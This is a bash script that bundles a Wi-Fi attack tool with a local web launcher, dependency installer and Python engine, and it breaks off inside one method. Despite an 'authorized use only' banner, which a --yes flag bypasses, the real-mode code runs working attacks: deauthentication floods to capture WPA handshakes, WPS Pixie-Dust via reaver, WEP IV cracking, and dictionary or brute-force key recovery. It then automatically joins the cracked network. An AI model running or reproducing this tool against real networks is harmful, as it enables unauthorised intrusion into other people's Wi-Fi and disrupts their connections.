#!/usr/bin/env bash
#
# single-script.sh — educational Wi-Fi security auditing, self-contained.
# Only audit networks you own or have written permission to test.
#
set -euo pipefail

HOSTNAME_LOCAL="crack-wifi.local"
BIND_HOST="127.0.0.1"
PORT="8777"
MODE="auto"
MANAGE_DNS="1"
ASSUME_YES="0"
OPEN_BROWSER="1"
SKIP_SETUP="0"
WORDLIST_DEFAULT="/usr/share/wordlists/rockyou.txt"
HOSTS_FILE="/etc/hosts"
HOSTS_MARKER="# added-by-single-script.sh"
SERVER_PID=""
BUNDLE=""

if [[ -t 1 ]]; then
  C_RESET=$'\e[0m'; C_BOLD=$'\e[1m'; C_DIM=$'\e[2m'
  C_RED=$'\e[31m'; C_GRN=$'\e[32m'; C_YEL=$'\e[33m'; C_BLU=$'\e[34m'; C_CYA=$'\e[36m'
else
  C_RESET=''; C_BOLD=''; C_DIM=''; C_RED=''; C_GRN=''; C_YEL=''; C_BLU=''; C_CYA=''
fi

log()  { printf '%s\n' "${C_CYA}[*]${C_RESET} $*"; }
ok()   { printf '%s\n' "${C_GRN}[+]${C_RESET} $*"; }
warn() { printf '%s\n' "${C_YEL}[!]${C_RESET} $*"; }
err()  { printf '%s\n' "${C_RED}[x]${C_RESET} $*" >&2; }
step() { printf '\n%s\n' "${C_BOLD}${C_BLU}==>${C_RESET} ${C_BOLD}$*${C_RESET}"; }
have() { command -v "$1" >/dev/null 2>&1; }

usage() {
  cat <<EOF
crack-wifi — educational Wi-Fi auditing launcher (single file)

Usage: sudo ./single-script.sh [options]

  --demo            Force demo mode (no hardware or root needed).
  --real            Force real mode (root + aircrack-ng + monitor-capable card).
  --port <n>        Web UI port (default: ${PORT}).
  --host <ip>       Bind address (default: ${BIND_HOST}).
  --wordlist <f>    Default dictionary (default: ${WORDLIST_DEFAULT}).
  --no-dns          Don't touch /etc/hosts; use http://${BIND_HOST}:PORT.
  --no-browser      Don't auto-open a browser.
  --skip-setup      Don't auto-install missing dependencies.
  -y, --yes         Skip the interactive authorization prompt.
  -h, --help        Show this help.
EOF
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --demo) MODE="demo"; shift ;;
    --real) MODE="real"; shift ;;
    --port) PORT="${2:?}"; shift 2 ;;
    --host) BIND_HOST="${2:?}"; shift 2 ;;
    --wordlist) WORDLIST_DEFAULT="${2:?}"; shift 2 ;;
    --no-dns) MANAGE_DNS="0"; shift ;;
    --no-browser) OPEN_BROWSER="0"; shift ;;
    --skip-setup) SKIP_SETUP="1"; shift ;;
    -y|--yes) ASSUME_YES="1"; shift ;;
    -h|--help) usage; exit 0 ;;
    *) err "Unknown option: $1"; usage; exit 1 ;;
  esac
done

authorize() {
  printf '%s\n' "${C_YEL}${C_BOLD}Authorized use only.${C_RESET}${C_YEL} Only audit networks you own or have written permission to test.${C_RESET}"
  if [[ "$ASSUME_YES" == "1" ]]; then
    warn "Authorization auto-accepted (--yes)."
    return 0
  fi
  read -r -p "Type 'I AGREE' to confirm you are authorized: " reply
  [[ "$reply" == "I AGREE" ]] || { err "Authorization not given. Exiting."; exit 1; }
  ok "Authorization confirmed."
}

extract_bundle() {
  BUNDLE="$(mktemp -d "${TMPDIR:-/tmp}/crack-wifi.XXXXXX")"
  mkdir -p "${BUNDLE}/server" "${BUNDLE}/lib" "${BUNDLE}/web"

  cat > "${BUNDLE}/setup.sh" <<'CRACK_EOF_SETUP'
#!/usr/bin/env bash
set -euo pipefail

if [[ -t 1 ]]; then
  C_RESET=$'\e[0m'; C_BOLD=$'\e[1m'
  C_GRN=$'\e[32m'; C_YEL=$'\e[33m'; C_RED=$'\e[31m'; C_CYA=$'\e[36m'
else
  C_RESET=''; C_BOLD=''; C_GRN=''; C_YEL=''; C_RED=''; C_CYA=''
fi
log()  { printf '%s\n' "${C_CYA}[*]${C_RESET} $*"; }
ok()   { printf '%s\n' "${C_GRN}[+]${C_RESET} $*"; }
warn() { printf '%s\n' "${C_YEL}[!]${C_RESET} $*"; }
err()  { printf '%s\n' "${C_RED}[x]${C_RESET} $*" >&2; }
have() { command -v "$1" >/dev/null 2>&1; }

declare -A PKG=(
  [airodump-ng]="aircrack-ng"
  [aircrack-ng]="aircrack-ng"
  [aireplay-ng]="aircrack-ng"
  [airmon-ng]="aircrack-ng"
  [iw]="iw"
  [reaver]="reaver"
  [wash]="reaver"
  [crunch]="crunch"
  [python3]="python3"
  [xdg-open]="xdg-utils"
  [nmcli]="network-manager"
)
REQUIRED=(python3 iw airmon-ng airodump-ng aireplay-ng aircrack-ng xdg-open)
OPTIONAL=(reaver wash crunch nmcli)

need_sudo() {
  if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    have sudo && echo "sudo" || echo ""
  else
    echo ""
  fi
}

collect_missing() {
  local -n _out=$1; shift
  _out=()
  local seen=""
  for cmd in "$@"; do
    if ! have "$cmd"; then
      local p="${PKG[$cmd]:-$cmd}"
      case " $seen " in
        *" $p "*) : ;;
        *) _out+=("$p"); seen="$seen $p" ;;
      esac
    fi
  done
}

main() {
  printf '%s\n' "${C_BOLD}${C_CYA}crack-wifi setup${C_RESET}"

  local missing_req=() missing_opt=()
  collect_missing missing_req "${REQUIRED[@]}"
  collect_missing missing_opt "${OPTIONAL[@]}"

  if [[ ${#missing_req[@]} -eq 0 && ${#missing_opt[@]} -eq 0 ]]; then
    ok "All dependencies already installed."
    return 0
  fi

  [[ ${#missing_req[@]} -gt 0 ]] && warn "Missing (required): ${missing_req[*]}"
  [[ ${#missing_opt[@]} -gt 0 ]] && log  "Missing (optional): ${missing_opt[*]}"

  if ! have apt-get; then
    err "No apt-get found — install with your package manager:"
    err "  required: ${missing_req[*]}"
    [[ ${#missing_opt[@]} -gt 0 ]] && err "  optional: ${missing_opt[*]}"
    [[ ${#missing_req[@]} -gt 0 ]] && return 1
    return 0
  fi

  local SUDO; SUDO="$(need_sudo)"
  if [[ "${EUID:-$(id -u)}" -ne 0 && -z "$SUDO" ]]; then
    err "Need root to install packages and 'sudo' is unavailable."
    return 1
  fi

  local to_install=("${missing_req[@]}" "${missing_opt[@]}")
  log "Installing: ${to_install[*]}"
  $SUDO apt-get update -y || warn "apt-get update reported problems — continuing."
  if ! $SUDO apt-get install -y "${to_install[@]}"; then
    [[ ${#missing_req[@]} -gt 0 ]] && $SUDO apt-get install -y "${missing_req[@]}"
  fi

  local still=()
  collect_missing still "${REQUIRED[@]}"
  if [[ ${#still[@]} -gt 0 ]]; then
    err "Still missing after install: ${still[*]}"
    return 1
  fi
  ok "Setup complete."
}

main "$@"
CRACK_EOF_SETUP

  cat > "${BUNDLE}/lib/difficulty.py" <<'CRACK_EOF_DIFFICULTY'
_ENC_BASE = {
    "OPEN": 0,
    "WEP": 8,
    "WPA": 55,
    "WPA2": 60,
    "WPA2/WPA3": 78,
    "WPA3": 92,
}

_LABELS = [(10, "Trivial"), (30, "Easy"), (55, "Moderate"), (80, "Hard"), (101, "Very hard")]


def _label_for(score):
    for threshold, label in _LABELS:
        if score < threshold:
            return label
    return "Very hard"


def _norm_enc(enc):
    e = (enc or "").upper().replace(" ", "")
    if "WPA3" in e and "WPA2" in e:
        return "WPA2/WPA3"
    for k in ("WPA3", "WPA2", "WPA", "WEP", "OPEN", "OPN"):
        if k in e:
            return "OPEN" if k == "OPN" else k
    return "WPA2"


def estimate(network):
    enc = _norm_enc(network.get("enc"))
    wps = bool(network.get("wps"))
    signal = network.get("signal")
    clients = int(network.get("clients") or 0)

    score = _ENC_BASE.get(enc, 60)
    reasons = []
    method = "handshake+dictionary"

    if enc == "OPEN":
        return {
            "score": 0, "label": "Trivial", "eta": "instant", "method": "open-join",
            "reasons": ["Network is open — no key required."],
        }

    if enc == "WEP":
        reasons.append("WEP is broken; enough IVs recover the key in minutes.")
        method = "wep-iv"
        score = 8

    if wps and enc in ("WPA", "WPA2", "WPA2/WPA3"):
        score = min(score, 35)
        method = "wps-pixie"
        reasons.append("WPS enabled — Pixie-Dust / PIN attack often bypasses the passphrase.")

    if enc == "WPA3":
        reasons.append("WPA3-SAE resists offline cracking; no easy path.")
    elif enc == "WPA2/WPA3":
        reasons.append("Mixed WPA2/WPA3 — WPA2 clients may still expose a handshake.")

    if signal is not None:
        try:
            s = int(signal)
            if s >= -55:
                reasons.append("Strong signal — handshake capture is reliable.")
                score -= 3
            elif s <= -80:
                reasons.append("Weak signal — capturing a handshake may take many tries.")
                score += 8
        except (TypeError, ValueError):
            pass

    if clients > 0:
        reasons.append(f"{clients} client(s) connected — easy to force a handshake via deauth.")
        score -= 4
    elif enc != "WEP":
        reasons.append("No clients connected — must wait for one to join to capture a handshake.")
        score += 6

    score = max(0, min(100, int(round(score))))

    if score < 10:
        eta = "seconds"
    elif score < 30:
        eta = "minutes"
    elif score < 55:
        eta = "minutes to hours"
    elif score < 80:
        eta = "hours to days (depends on wordlist)"
    else:
        eta = "impractical offline"

    return {"score": score, "label": _label_for(score), "eta": eta, "method": method, "reasons": reasons}
CRACK_EOF_DIFFICULTY

  cat > "${BUNDLE}/lib/engine.py" <<'CRACK_EOF_ENGINE'
import os
import re
import time
import uuid
import shutil
import threading
import subprocess

try:
    from .difficulty import estimate
except ImportError:
    from difficulty import estimate


class Job:
    def __init__(self, network, options):
        self.id = uuid.uuid4().hex[:12]
        self.network = network
        self.options = options
        self.status = "running"
        self.result = None
        self.log = []
        self.progress = None
        self.created = time.time()
        self._stop = threading.Event()
        self._lock = threading.Lock()

    def emit(self, phase, msg, level="info", pct=None):
        with self._lock:
            if pct is not None:
                self.progress = {"phase": phase, "pct": max(0, min(100, int(pct)))}
            self.log.append({
                "t": round(time.time() - self.created, 2),
                "phase": phase,
                "level": level,
                "msg": msg,
                "pct": (self.progress["pct"] if pct is not None else None),
            })

    def snapshot(self, since=0):
        with self._lock:
            events = self.log[since:]
        return {
            "id": self.id,
            "status": self.status,
            "result": self.result,
            "network": self.network,
            "events": events,
            "total_events": len(self.log),
            "progress": self.progress,
        }

    def stopped(self):
        return self._stop.is_set()

    def request_stop(self):
        self._stop.set()


class BaseEngine:
    def __init__(self, wordlist=None):
        self.wordlist = wordlist
        self.jobs = {}
        self._networks = []
        self.handshakes = set()

    def start_attack(self, bssid, options):
        net = next((n for n in self._networks if n["bssid"] == bssid), None)
        if net is None:
            net = {"bssid": bssid, "ssid": options.get("ssid", "(unknown)"),
                   "enc": options.get("enc", "WPA2"), "channel": options.get("channel", 1),
                   "signal": -60, "clients": 1, "wps": bool(options.get("wps"))}
        if "difficulty" not in net:
            net = dict(net)
            net["difficulty"] = estimate(net)
        job = Job(net, options)
        self.jobs[job.id] = job
        threading.Thread(target=self._run_attack_safe, args=(job,), daemon=True).start()
        return job.id

    def _run_attack_safe(self, job):
        try:
            self._run_attack(job)
        except Exception as e:
            job.emit("error", f"Attack aborted: {e}", "error")
            job.status = "failed"

    def get_job(self, job_id, since=0):
        job = self.jobs.get(job_id)
        return job.snapshot(since) if job else None

    def stop_job(self, job_id):
        job = self.jobs.get(job_id)
        if job and job.status == "running":
            job.request_stop()
            return True
        return False


_DEMO_NETWORKS = [
    ("Loft_5G",         "A4:2B:8C:11:02:F0", "WPA2",      36, -48, 3, False, "sunshine2021",   None),
    ("FRITZ!Box 7590",  "3C:A6:2F:9D:44:1A", "WPA2",      6,  -61, 2, True,  "01998877665544", None),
    ("xfinitywifi",     "12:34:56:78:9A:BC", "OPEN",      11, -70, 8, False, None,             None),
    ("Netgear-Guest",   "9C:3D:CF:00:AB:12", "WPA2",      1,  -55, 1, False, "password123",    None),
    ("HomeOffice",      "E0:CB:4E:77:88:99", "WPA2/WPA3", 44, -52, 4, False, None,             None),
    ("legacy_wifi",     "00:1D:0F:AA:BB:CC", "WEP",       3,  -66, 0, False, "1A2B3C4D5E",     None),
    ("StarbucksSecure", "B8:27:EB:12:34:56", "WPA2",      9,  -74, 0, True,  "coffee4life",    None),
    ("Vodafone-A1B2",   "44:E1:37:0F:2E:9D", "WPA2",      40, -58, 2, False, "8charsminimum",  None),
    ("NeighborNet",     "F4:F5:E8:01:23:45", "WPA3",      6,  -63, 1, False, None,             None),
    ("guest_portal",    "0A:0B:0C:0D:0E:0F", "OPEN",      1,  -59, 5, False, None,   "guest / welcome"),
]


class DemoEngine(BaseEngine):
    mode = "demo"

    def scan(self, duration=3):
        nets = []
        for (ssid, bssid, enc, ch, sig, clients, wps, secret, user) in _DEMO_NETWORKS:
            n = {"ssid": ssid, "bssid": bssid, "enc": enc, "channel": ch,
                 "signal": sig, "clients": clients, "wps": wps,
                 "has_handshake": bssid in self.handshakes,
                 "_secret": secret, "_user": user}
            n["difficulty"] = estimate(n)
            nets.append(n)
        self._networks = nets
        return [{k: v for k, v in n.items() if not k.startswith("_")} for n in nets]

    def _sleep(self, job, seconds):
        end = time.time() + seconds
        while time.time() < end:
            if job.stopped():
                return False
            time.sleep(0.1)
        return True

    def _run_attack(self, job):
        net = job.network
        opts = job.options
        enc = (net.get("enc") or "WPA2").upper()
        ssid = net.get("ssid")
        bssid = net.get("bssid")
        ch = net.get("channel")

        job.emit("init", f"Target selected: {ssid} ({bssid}) on channel {ch}, {enc}.")
        d = net["difficulty"]
        job.emit("init", f"Estimated difficulty: {d['label']} (score {d['score']}/100, ETA {d['eta']}).")

        if enc.startswith("OPEN") or enc == "OPN":
            if not self._sleep(job, 1): return self._finish(job, "stopped")
            job.emit("join", "Open network — no key required. Associating...")
            if not self._sleep(job, 1.5): return self._finish(job, "stopped")
            user = net.get("_user")
            connected, cmd = self._connect_sim(job, net, None)
            note = "Open network — no passphrase." + (f" Captive-portal creds: {user}" if user else "")
            job.result = {"key": None, "user": user, "method": "open-join",
                          "connected": connected, "connect_cmd": cmd, "note": note}
            return self._finish(job, "success")

        job.emit("monitor", "Enabling monitor mode on wlan0 -> wlan0mon (airmon-ng start wlan0).")
        if not self._sleep(job, 1.2): return self._finish(job, "stopped")
        job.emit("monitor", "Monitor interface wlan0mon is up.", "success")

        if enc == "WEP":
            job.emit("capture", f"Locking to channel {ch}, capturing IVs (airodump-ng).", pct=0)
            for pct in (12, 34, 58, 81, 100):
                if not self._sleep(job, 0.7): return self._finish(job, "stopped")
                job.emit("capture", f"Collected IVs... {pct}%", pct=pct)
            job.emit("crack", "Running aircrack-ng PTW attack on captured IVs.")
            if not self._sleep(job, 1.2): return self._finish(job, "stopped")
            return self._succeed(job, net, method="wep-iv")

        if net.get("wps") and opts.get("method") in (None, "auto", "wps-pixie"):
            job.emit("wps", "WPS is enabled — trying Pixie-Dust (reaver -K 1).")
            if not self._sleep(job, 1.5): return self._finish(job, "stopped")
            if net["difficulty"]["method"] == "wps-pixie":
                job.emit("wps", "Pixie-Dust recovered the WPS PIN.", "success")
                if not self._sleep(job, 0.8): return self._finish(job, "stopped")
                return self._succeed(job, net, method="wps-pixie")
            job.emit("wps", "Pixie-Dust failed — falling back to handshake capture.", "warn")

        if enc.startswith("WPA3"):
            job.emit("capture", "Target is WPA3-SAE. Attempting to capture SAE exchange...")
            if not self._sleep(job, 2): return self._finish(job, "stopped")
            job.emit("crack", "WPA3-SAE has no offline-crackable 4-way handshake.", "warn")
            job.emit("done", "No practical offline attack against WPA3-SAE.", "error")
            return self._finish(job, "failed")

        if bssid in self.handshakes:
            job.emit("capture", "Reusing the 4-way handshake captured earlier this session.", "success")
        else:
            job.emit("capture", f"Listening for WPA handshake on channel {ch} (airodump-ng -c {ch}).")
            if not self._sleep(job, 1): return self._finish(job, "stopped")
            if net.get("clients", 0) > 0:
                job.emit("deauth", f"{net['clients']} client(s) present. Sending deauth (aireplay-ng --deauth 5).")
            else:
                job.emit("deauth", "No clients connected — waiting for one to join...", "warn")
                if not self._sleep(job, 1.5): return self._finish(job, "stopped")
                job.emit("deauth", "A client joined. Sending deauth to capture the handshake.")
            if not self._sleep(job, 1.5): return self._finish(job, "stopped")
            job.emit("capture", "WPA handshake captured  (EAPOL 4/4).", "success")
            self.handshakes.add(bssid)

        method = opts.get("method") or "handshake+dictionary"
        if method == "handshake+bruteforce" or opts.get("bruteforce"):
            charset = opts.get("charset", "digits")
            length = opts.get("length", 8)
            job.emit("crack", f"Bruteforce: {charset}, length {length} (aircrack-ng via crunch pipe).", pct=0)
            for pct in (3, 9, 21, 40, 66, 92, 100):
                if not self._sleep(job, 0.8): return self._finish(job, "stopped")
                job.emit("crack", f"Keyspace searched... {pct}%", pct=pct)
            return self._succeed(job, net, method="handshake+bruteforce")

        wl = opts.get("wordlist") or self.wordlist or "rockyou.txt"
        wl = self._resolve_wordlist(job, wl)
        if wl is None:
            return self._finish(job, "stopped" if job.stopped() else "failed")
        job.emit("crack", f"Dictionary attack against handshake (aircrack-ng -w {os.path.basename(wl)}).", pct=0)
        for pct in (5, 18, 37, 59, 78, 95, 100):
            if not self._sleep(job, 0.7): return self._finish(job, "stopped")
            job.emit("crack", f"Tested {pct * 1423:,} keys... {pct}%", pct=pct)
        return self._succeed(job, net, method="handshake+dictionary")

    def _resolve_wordlist(self, job, wl):
        if isinstance(wl, str) and wl.lower().startswith(("http://", "https://")):
            name = wl.rstrip("/").split("/")[-1] or "wordlist.txt"
            job.emit("download", f"Fetching wordlist from the internet: {wl}", pct=0)
            for pct in (8, 26, 50, 74, 92, 100):
                if not self._sleep(job, 0.5):
                    return None
                job.emit("download", f"Downloading {name}... {pct}%", pct=pct)
            job.emit("download", f"Saved {name} — using it for the dictionary attack.", "success", pct=100)
            return name
        return wl

    def _connect_sim(self, job, net, key):
        ssid = net.get("ssid")
        shown = (f"nmcli dev wifi connect '{ssid}' password '{key}'" if key
                 else f"nmcli dev wifi connect '{ssid}'")
        if not job.options.get("connect", True):
            job.emit("connect", f"Auto-connect off. Connect with: {shown}")
            return False, shown
        job.emit("connect", "Restoring managed mode and (re)starting NetworkManager...")
        self._sleep(job, 1.0)
        job.emit("connect", f"Connecting: {shown}")
        self._sleep(job, 1.0)
        job.emit("connect", f"Connected to {ssid}. You are on the network.", "success")
        return True, shown

    def _succeed(self, job, net, method):
        secret = net.get("_secret") or "(demo-key-not-set)"
        user = net.get("_user")
        job.emit("done", f"KEY FOUND: {secret}", "success")
        connected, cmd = self._connect_sim(job, net, secret)
        job.result = {"key": secret, "user": user, "method": method,
                      "connected": connected, "connect_cmd": cmd, "note": "Recovered in demo mode."}
        return self._finish(job, "success")

    def _finish(self, job, status):
        job.status = status
        if status == "stopped":
            job.emit("done", "Attack stopped by user.", "warn")
        return status


class RealEngine(BaseEngine):
    mode = "real"

    def __init__(self, wordlist=None, workdir="/tmp/crack-wifi"):
        super().__init__(wordlist)
        self.workdir = workdir
        os.makedirs(self.workdir, exist_ok=True)
        self.mon_iface = None

    def _run(self, cmd, timeout=None):
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)

    def _wireless_ifaces(self):
        try:
            out = self._run(["iw", "dev"]).stdout
        except Exception:
            return []
        return re.findall(r"Interface\s+(\S+)", out)

    def _ensure_monitor(self, job):
        ifaces = self._wireless_ifaces()
        mon = next((i for i in ifaces if i.endswith("mon")), None)
        if mon:
            self.mon_iface = mon
            return mon
        base = ifaces[0] if ifaces else "wlan0"
        job.emit("monitor", f"Starting monitor mode on {base} (airmon-ng start {base}).")
        self._run(["airmon-ng", "check", "kill"])
        self._run(["airmon-ng", "start", base])
        mon = next((i for i in self._wireless_ifaces() if i.endswith("mon")), base + "mon")
        self.mon_iface = mon
        job.emit("monitor", f"Monitor interface {mon} is up.", "success")
        return mon

    def scan(self, duration=8):
        ifaces = self._wireless_ifaces()
        mon = next((i for i in ifaces if i.endswith("mon")), None)
        if not mon:
            base = ifaces[0] if ifaces else "wlan0"
            self._run(["airmon-ng", "check", "kill"])
            self._run(["airmon-ng", "start", base])
            mon = next((i for i in self._wireless_ifaces() if i.endswith("mon")), base + "mon")
        self.mon_iface = mon

        prefix = os.path.join(self.workdir, "scan")
        for ext in ("csv", "cap", "kismet.csv", "kismet.netxml"):
            for f in _glob(prefix, ext):
                try: os.remove(f)
                except OSError: pass

        proc = subprocess.Popen(
            ["airodump-ng", "--write-interval", "1", "--output-format", "csv", "-w", prefix, mon],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration)
        proc.terminate()
        try: proc.wait(timeout=3)
        except subprocess.TimeoutExpired: proc.kill()

        csvs = _glob(prefix, "csv")
        nets = _parse_airodump_csv(csvs[0]) if csvs else []

        wps = self._wps_bssids(mon, duration=min(6, duration))
        for n in nets:
            if n["bssid"].upper() in wps:
                n["wps"] = True
            n["has_handshake"] = n["bssid"] in self.handshakes
            n["difficulty"] = estimate(n)

        self._networks = nets
        return nets

    def _wps_bssids(self, mon, duration=6):
        if not shutil.which("wash"):
            return set()
        try:
            proc = subprocess.Popen(["wash", "-i", mon], stdout=subprocess.PIPE,
                                    stderr=subprocess.DEVNULL, text=True)
            time.sleep(duration)
            proc.terminate()
            try:
                out, _ = proc.communicate(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                out, _ = proc.communicate()
        except Exception:
            return set()
        found = set()
        for line in (out or "").splitlines():
            m = re.match(r"\s*([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})", line)
            if m:
                found.add(m.group(1).upper())
        return found

    def _restore_managed(self, job=None):
        for i in self._wireless_ifaces():
            if i.endswith("mon"):
                self._run(["airmon-ng", "stop", i])
        self.mon_iface = None
        for cmd in (["systemctl", "restart", "NetworkManager"],
                    ["service", "NetworkManager", "restart"],
                    ["service", "network-manager", "restart"]):
            if shutil.which(cmd[0]):
                self._run(cmd)
                break
        time.sleep(3)

    def _connect(self, job, ssid, key=None):
        shown = (f"nmcli dev wifi connect '{ssid}' password '{key}'" if key
                 else f"nmcli dev wifi connect '{ssid}'")
        if not shutil.which("nmcli"):
            job.emit("connect", "nmcli not found — connect via your Wi-Fi menu.", "warn")
            return False, shown
        job.emit("connect", "Restoring managed mode and (re)starting NetworkManager...")
        self._restore_managed(job)
        self._run(["nmcli", "dev", "wifi", "rescan"], timeout=20)
        time.sleep(2)
        cmd = (["nmcli", "dev", "wifi", "connect", ssid, "password", key] if key
               else ["nmcli", "dev", "wifi", "connect", ssid])
        job.emit("connect", f"Connecting: {shown}")
        try:
            r = self._run(cmd, timeout=45)
        except Exception as e:
            job.emit("connect", f"Connect error: {e}. Run manually: {shown}", "warn")
            return False, shown
        out = ((r.stdout or "") + (r.stderr or "")).lower()
        joined = "successfully activated" in out or (r.returncode == 0 and "error" not in out)
        if joined:
            job.emit("connect", f"Connected to {ssid}. You are on the network.", "success")
        else:
            job.emit("connect", f"Auto-connect failed. Run manually: {shown}", "warn")
        return joined, shown

    def _resolve_wordlist(self, job, wl):
        if not (isinstance(wl, str) and wl.lower().startswith(("http://", "https://"))):
            return wl
        import urllib.request
        name = wl.rstrip("/").split("/")[-1] or "wordlist.txt"
        dest = os.path.join(self.workdir, name)
        if os.path.exists(dest) and os.path.getsize(dest) > 0:
            job.emit("download", f"Using cached wordlist {name}.", "success", pct=100)
            return dest
        job.emit("download", f"Fetching wordlist from the internet: {wl}", pct=0)
        try:
            req = urllib.request.Request(wl, headers={"User-Agent": "crack-wifi/1.0"})
            with urllib.request.urlopen(req, timeout=30) as resp, open(dest, "wb") as out:
                total = int(resp.headers.get("Content-Length") or 0)
                read = 0
                last = -1
                while True:
                    if job.stopped():
                        return None
                    chunk = resp.read(65536)
                    if not chunk:
                        break
                    out.write(chunk)
                    read += len(chunk)
                    if total:
                        pct = int(read * 100 / total)
                        if pct != last and pct % 5 == 0:
                            last = pct
                            job.emit("download", f"Downloading {name}... {pct}%", pct=pct)
        except Exception as e:
            job.emit("download", f"Wordlist download failed: {e}", "error")
            return None
        job.emit("download", f"Saved {name} ({read:,} bytes).", "success", pct=100)
        return dest

    def _succeed(self, job, net, key, method, note, opts, user=None):
        if key:
            job.emit("done", f"KEY FOUND: {key}", "success")
        connected, cmd = (False, None)
        if opts.get("connect", True):
            connected, cmd = self._connect(job, net.get("ssid"), key)
        job.result = {"key": key, "user": user, "method": method,
                      "connected": connected, "connect_cmd": cmd, "note": note}
        return self._finish(job, "success")

    def _run_attack(self, job):
        net = job.network
        opts = job.options
        enc = (net.get("enc") or "WPA2").upper()
        bssid = net["bssid"]
        ch = net.get("channel", 1)

        job.emit("init", f"Target: {net.get('ssid')} ({bssid}) ch {ch} {enc}.")

        if enc.startswith("OPEN") or enc == "OPN":
            job.emit("join", "Open network — no key required.")
            connected, cmd = (False, None)
            if opts.get("connect", True):
                connected, cmd = self._connect(job, net.get("ssid"), None)
            job.result = {"key": None, "user": None, "method": "open-join",
                          "connected": connected, "connect_cmd": cmd,
                          "note": "Open network — no passphrase."}
            return self._finish(job, "success")

        mon = self._ensure_monitor(job)
        if job.stopped(): return self._finish(job, "stopped")

        if enc == "WEP":
            wep_prefix = os.path.join(self.workdir, "wep_" + bssid.replace(":", ""))
            for f in _glob(wep_prefix, "cap"):
                try: os.remove(f)
                except OSError: pass
            job.emit("capture", f"Collecting WEP IVs on channel {ch} (airodump-ng).")
            dump = subprocess.Popen(
                ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", wep_prefix, "--output-format", "cap", mon],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._run(["aireplay-ng", "--arpreplay", "-b", bssid, mon], timeout=10)
            key = None
            try:
                deadline = time.time() + opts.get("wep_timeout", 300)
                while time.time() < deadline and not job.stopped():
                    time.sleep(6)
                    caps = _glob(wep_prefix, "cap")
                    if caps:
                        r = self._run(["aircrack-ng", "-b", bssid, caps[0]], timeout=30)
                        key = _parse_aircrack_key(r.stdout)
                        if key:
                            key = key.replace(":", "")
                            break
                        job.emit("crack", "Not enough IVs yet — keep collecting...")
            finally:
                dump.terminate()
                try: dump.wait(timeout=3)
                except subprocess.TimeoutExpired: dump.kill()
            if job.stopped(): return self._finish(job, "stopped")
            if key:
                return self._succeed(job, net, key, "wep-iv", "Recovered WEP key from captured IVs.", opts)
            job.emit("crack", "Could not gather enough IVs for the WEP key.", "error")
            return self._finish(job, "failed")

        if net.get("wps") and opts.get("method") in (None, "auto", "wps-pixie") and shutil.which("reaver"):
            job.emit("wps", f"WPS enabled — reaver Pixie-Dust on {bssid}.")
            r = self._run(["reaver", "-i", mon, "-b", bssid, "-c", str(ch), "-K", "1", "-N"],
                          timeout=opts.get("wps_timeout", 180))
            m = re.search(r"WPA PSK:\s*'([^']*)'", r.stdout or "")
            pin = re.search(r"WPS PIN:\s*'?(\d+)", r.stdout or "")
            if m:
                note = f"Recovered via WPS (PIN {pin.group(1) if pin else '?'})."
                return self._succeed(job, net, m.group(1), "wps-pixie", note, opts)
            job.emit("wps", "Pixie-Dust did not recover the key — trying handshake.", "warn")

        if enc.startswith("WPA3"):
            job.emit("crack", "WPA3-SAE — no practical offline attack.", "error")
            return self._finish(job, "failed")

        cap_prefix = os.path.join(self.workdir, "hs_" + bssid.replace(":", ""))
        cached = _glob(cap_prefix, "cap")
        if bssid in self.handshakes and cached and _has_handshake(cached[0], bssid):
            job.emit("capture", "Reusing the handshake captured earlier this session.", "success")
            caps = cached
        else:
            for f in cached:
                try: os.remove(f)
                except OSError: pass
            job.emit("capture", f"Capturing handshake on channel {ch} (airodump-ng).")
            dump = subprocess.Popen(
                ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", cap_prefix, "--output-format", "cap", mon],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            got = False
            try:
                deadline = time.time() + opts.get("capture_timeout", 90)
                while time.time() < deadline and not job.stopped():
                    job.emit("deauth", f"Sending deauth to {bssid} (aireplay-ng --deauth 5).")
                    self._run(["aireplay-ng", "--deauth", "5", "-a", bssid, mon], timeout=15)
                    time.sleep(4)
                    caps = _glob(cap_prefix, "cap")
                    if caps and _has_handshake(caps[0], bssid):
                        got = True
                        break
            finally:
                dump.terminate()
                try: dump.wait(timeout=3)
                except subprocess.TimeoutExpired: dump.kill()
            if job.stopped(): return self._finish(job, "stopped")
            caps = _glob(cap_prefix, "cap")
            if not caps or not got:
                job.emit("capture", "Could not capture a handshake in time.", "error")
                return self._finish(job, "failed")
            self.handshakes.add(bssid)
            job.emit("capture", "Handshake captured.", "success")

        wl = opts.get("wordlist") or self.wordlist
        if opts.get("bruteforce") or opts.get("method") == "handshake+bruteforce":
            charset = {"digits": "0123456789",
                       "lower": "abcdefghijklmnopqrstuvwxyz",
                       "alnum": "abcdefghijklmnopqrstuvwxyz0123456789"}.get(opts.get("charset", "digits"), "0123456789")
            length = int(opts.get("length", 8))
            job.emit("crack", f"Bruteforce via crunch | aircrack-ng ({charset[:6]}..., len {length}).")
            if not shutil.which("crunch"):
                job.emit("crack", "crunch not installed (apt install crunch).", "error")
                return self._finish(job, "failed")
            crunch = subprocess.Popen(["crunch", str(length), str(length), charset], stdout=subprocess.PIPE)
            r = subprocess.run(["aircrack-ng", "-b", bssid, "-w", "-", caps[0]],
                               stdin=crunch.stdout, capture_output=True, text=True)
            crunch.terminate()
            key = _parse_aircrack_key(r.stdout)
            method = "handshake+bruteforce"
        else:
            wl = self._resolve_wordlist(job, wl)
            if wl is None:
                return self._finish(job, "stopped" if job.stopped() else "failed")
            if not wl or not os.path.exists(wl):
                job.emit("crack", f"Wordlist not found: {wl}", "error")
                return self._finish(job, "failed")
            job.emit("crack", f"Dictionary attack (aircrack-ng -w {os.path.basename(wl)}).", pct=0)
            r = self._run(["aircrack-ng", "-b", bssid, "-w", wl, caps[0]], timeout=opts.get("crack_timeout", 3600))
            key = _parse_aircrack_key(r.stdout)
            method = "handshake+dictionary"

        if key:
            return self._succeed(job, net, key, method, "Recovered from captured handshake.", opts)
        job.emit("crack", "Key not found with the given wordlist/keyspace.", "error")
        return self._finish(job, "failed")

    def _finish(self, job, status):
